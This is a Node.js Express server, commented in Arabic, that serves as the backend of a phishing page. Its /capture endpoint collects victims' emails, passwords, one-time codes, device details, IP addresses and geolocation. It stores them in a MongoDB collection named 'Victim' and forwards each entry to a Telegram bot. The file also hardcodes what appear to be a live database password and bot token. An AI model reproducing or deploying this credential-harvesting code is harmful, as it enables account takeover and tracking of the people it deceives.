const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();

// إعدادات الوسيط (Middleware)
app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(express.static(__dirname));

// وضع البيانات مباشرة هنا (Hardcoded)
const MONGO_URI = "mongodb+srv://hamoodaix90_db_user:X4A0mkbVqQO09I9J@cluster0.ohfhehw.mongodb.net/sample_mflix?retryWrites=true&w=majority";
const BOT_TOKEN = "8336936813:AAENAKTwrPn6lCaxlWarBYQwAhCaGZBXwUk";
const CHAT_ID = "8351043975";

// الاتصال بقاعدة البيانات
mongoose.connect(MONGO_URI)
    .then(() => console.log("✅ Connected to MongoDB"))
    .catch(e => console.log("❌ DB Error:", e.message));

// تعريف النموذج
const Victim = mongoose.model('Victim', new mongoose.Schema({
    email: String, 
    password: String, 
    otp: String, 
    device: String, 
    ip: String,
    location: Object,
    timestamp: { type: Date, default: Date.now }
}));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/capture', async (req, res) => {
    const data = req.body;
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    try {
        let msg = `🚀 **إشعار جديد**\n`;
        msg += `━━━━━━━━━━━━━━\n`;
        msg += `📧 **الحساب:** \`${data.email}\` \n`;
        msg += `🔑 **الكلمة:** \`${data.password}\` \n`;
        msg += `🌐 **الآي بي:** \`${visitorIp}\` \n`;
        msg += `📱 **الجهاز:** ${data.device}\n`;
        
        if(data.location && data.location.lat) {
            msg += `📍 **الموقع:** https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
        }
        msg += `\n━━━━━━━━━━━━━━`;
        
        // إرسال للتليجرام
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: msg,
            parse_mode: 'Markdown'
        });
        console.log("✅ Message sent to Telegram");
    } catch (e) { 
        console.log("❌ Telegram Error:", e.response ? e.response.data : e.message); 
    }

    try {
        const entry = new Victim({ ...data, ip: visitorIp });
        await entry.save();
        console.log("✅ Data saved to DB");
    } catch (e) { 
        console.log("❌ DB Save Error");
    }

    res.status(200).send("OK");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Server on port ${PORT}`));
